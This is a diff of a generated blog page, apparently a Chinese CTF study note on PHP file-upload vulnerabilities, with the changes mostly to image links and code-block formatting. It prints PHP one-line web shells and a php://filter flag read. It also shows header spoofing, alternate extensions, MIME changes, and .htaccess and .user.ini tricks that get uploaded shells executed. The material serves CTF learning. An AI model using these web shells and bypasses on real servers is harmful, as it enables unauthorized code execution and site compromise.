@@ -74,7 +74,7 @@ Putao0v0 = putao</title>
       <i class="ic i-pen"></i>
     </span>
     <span class="text">Symbols count in article</span>
-    <span>2k</span>
+    <span>1.9k</span>
     <span class="text">words</span>
   </span>
   <span class="item" title="Reading time">
@@ -115,12 +115,12 @@ Putao0v0 = putao</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gicivghyooj20zk0m8dir.jpg"></li>
-          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipeuibk9fj20zk0m8ay2.jpg"></li>
-          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gicli9lfebj20zk0m84qp.jpg"></li>
-          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giph4wqtg4j20zk0m8x6p.jpg"></li>
-          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipey84bjtj20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipesrnqv3j20zk0m8ava.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclwuom7cj20zk0m8dvn.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeubcbajj20zk0m8h1h.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclfdu6exj20zk0m87hw.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giph4baakhj20zk0m8h5q.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicitht3xtj20zk0m8k5v.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciryrr3rj20zk0m8nhk.jpg"></li>
         </ul>
       </div>
     </header>
@@ -167,7 +167,14 @@ Putao0v0 = putao</title>
     
 
     <p>一句话木马</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line">&lt;?=system(&quot;tac ../f*&quot;);?&gt;</span><br><span class="line">&lt;?=`tac ../f*`?&gt;</span><br><span class="line">&lt;?=system(&quot;tac ../f*&quot;)?&gt;</span><br><span class="line">&lt;?=include&quot;ph&quot;.&quot;p://filter/convert.base64-encode/resource=../flag.p&quot;.&quot;hp&quot;?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php @eval($_POST['cmd']);?&gt;
+&lt;?=system(&quot;tac ../f*&quot;);?&gt;
+&lt;?=`tac ../f*`?&gt;
+&lt;?=system(&quot;tac ../f*&quot;)?&gt;
+&lt;?=include&quot;ph&quot;.&quot;p://filter/convert.base64-encode/resource=../flag.p&quot;.&quot;hp&quot;?&gt;
+
+
+</code></pre>
 <h2 id="检测绕过"><a class="markdownIt-Anchor" href="#检测绕过">#</a> 检测绕过</h2>
 <h3 id="1js检测"><a class="markdownIt-Anchor" href="#1js检测">#</a> 1.js 检测</h3>
 <p>一般网页会有 JavaScript 对文件名后缀进行黑名单或者白名单检测</p>
@@ -196,7 +203,9 @@ Putao0v0 = putao</title>
 <p>对文件头进行检测，其实做 misc 的时候用 010 查看文件会发现不同文件的文件头也是不同的，所以源码可能会用正则匹配等形式对文件头进行检测</p>
 <p>只要在上传的文件前面加上对应文件头的字符串就好了</p>
 <p>例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>GIF89a
+&lt;?php @eval($_POST['cmd']);?&gt;
+</code></pre>
 <h3 id="4黑名单检测"><a class="markdownIt-Anchor" href="#4黑名单检测">#</a> 4. 黑名单检测</h3>
 <p>有时候并不会规定必须上传.jpg 等文件，但是会存在一个黑名单，使得我们不能上传类似于 php 文件</p>
 <p>有时候可以通过：</p>
@@ -208,14 +217,20 @@ Putao0v0 = putao</title>
 </ul>
 <p>例题：[GEEK] Upload</p>
 <p>● 文件上传漏洞</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF98a</span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;eval($_POST[&#x27;cmd&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>GIF98a
+&lt;script language='php'&gt;eval($_POST['cmd']);&lt;/script&gt;
+</code></pre>
 <p>创建 php 文件，放入一句话木马上传</p>
 <p>后缀有：php、php3、php4、phps、php7、phtml</p>
 <p>最后用 phtml，然后抓包改变文件上传类型为 image/gif 可以绕过</p>
 <p>上传成功，再用蚁剑</p>
 <p>上传的文件一般会在 upload 文件夹下</p>
 <p>● .htaccess</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .gif</span><br><span class="line"></span><br><span class="line">// 将所有文件当作php文件来解析</span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
+<pre><code>AddType application/x-httpd-php .gif
+
+// 将所有文件当作php文件来解析
+SetHandler application/x-httpd-php
+</code></pre>
 <ul>
 <li>例题：[MRCTF] 传你🐎呢</li>
 </ul>
@@ -234,14 +249,23 @@ Putao0v0 = putao</title>
 <li>怎么利用.user.ini 文件？</li>
 </ol>
 <p>答：我们可以在.user.ini 文件中写入 auto_prepend_file 函数，auto_prepend_file 表示在 php 程序加载第一个 php 代码前加载的 php 文件，这时候我们就可以引入一个我们自己所写的 php 文件，也就是一个一句话木马。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file  (函数)</span><br><span class="line"></span><br><span class="line">auto_prepend_file 在页面顶部加载文件</span><br><span class="line"></span><br><span class="line">auto_append_file  在页面底部加载文件</span><br><span class="line"></span><br><span class="line">使用这种方法可以不需要改动任何页面，当需要修改顶部或底部require文件时，只需要修改auto_prepend_file与auto_append_file的值即可。</span><br></pre></td></tr></table></figure>
+<pre><code>auto_prepend_file  (函数)
+
+auto_prepend_file 在页面顶部加载文件
+
+auto_append_file  在页面底部加载文件
+
+使用这种方法可以不需要改动任何页面，当需要修改顶部或底部require文件时，只需要修改auto_prepend_file与auto_append_file的值即可。
+</code></pre>
 <p>使用.user.ini 之后再上传带有一句话木马的图片，然后可以访问 index.php 执行 php 代码，然后用蚁剑连接</p>
 <p><code>auto_prepend_file=1.jpg</code></p>
 <ul>
 <li>例题：[SUCTF] checkln<br>
 .user.ini</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=a.jpg</span><br></pre></td></tr></table></figure>
+<pre><code>GIF89a
+auto_prepend_file=a.jpg
+</code></pre>
 <p>a.jpg</p>
 <p>GIF89a</p>
 <script language='php'>eval($_POST['123']);</script>
@@ -297,7 +321,7 @@ Putao0v0 = putao</title>
     <div class="item left">
       
 
-  <a href="/2022/06/17/study/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicitcxhpij20zk0m8hdt.jpg" title="操作系统">
+  <a href="/2022/06/17/study/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicit31ffoj20zk0m8naf.jpg" title="操作系统">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> 学习</span>
   <h3>操作系统</h3>
@@ -307,7 +331,7 @@ Putao0v0 = putao</title>
     <div class="item right">
       
 
-  <a href="/2022/06/27/web/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicitcxhpij20zk0m8hdt.jpg" title="信息搜集">
+  <a href="/2022/06/27/web/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclhfehz7j20zk0m8u0x.jpg" title="信息搜集">
   <span class="type">Next Post</span>
   <span class="category"><i class="ic i-flag"></i> WEB</span>
   <h3>信息搜集</h3>
@@ -452,13 +476,13 @@ Putao0v0 = putao</title>
     <span class="post-meta-item-icon">
       <i class="ic i-chart-area"></i>
     </span>
-    <span title="Symbols count total">251k words</span>
+    <span title="Symbols count total">240k words</span>
 
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="ic i-coffee"></i>
     </span>
-    <span title="Reading time total">3:49</span>
+    <span title="Reading time total">3:38</span>
   </div>
   <div class="powered-by">
     Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
